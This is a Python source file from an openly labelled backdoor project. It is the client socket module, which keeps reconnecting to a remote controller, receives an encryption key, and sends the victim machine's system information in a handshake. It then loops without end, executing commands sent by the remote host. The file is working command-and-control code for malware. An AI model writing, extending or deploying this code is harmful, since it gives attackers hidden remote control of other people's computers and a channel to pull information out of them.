"""
https://github.com/xp4xbox/Python-Backdoor

@author    xp4xbox

license: https://github.com/xp4xbox/Python-Backdoor/blob/master/license
"""
import base64
import socket
import time

from src.client import control
from src.encrypted_socket import EncryptedSocket
from src.client.command_handler import CommandHandler
from src.defs import *


class Socket(EncryptedSocket):
    def __init__(self, host, port):
        super().__init__()

        self.host = host
        self.port = port
        self.socket = socket.socket()

    def connect(self):
        while True:  # infinite loop until socket can connect
            try:
                self.socket.connect((self.host, self.port))
            except socket.error:
                time.sleep(3)  # wait 3 seconds to try again
            else:
                break

        # first message must always be the key as b64
        key = base64.b64decode(self.recv(False))
        self.set_key(key)
        self.logger.debug(f"recv key: {key}")

        # send handshake
        self.send_json(CLIENT_HANDSHAKE, control.get_info())

        ch = CommandHandler(self)

        while True:
            msg = self.recv_json()
            ch.parse(msg)
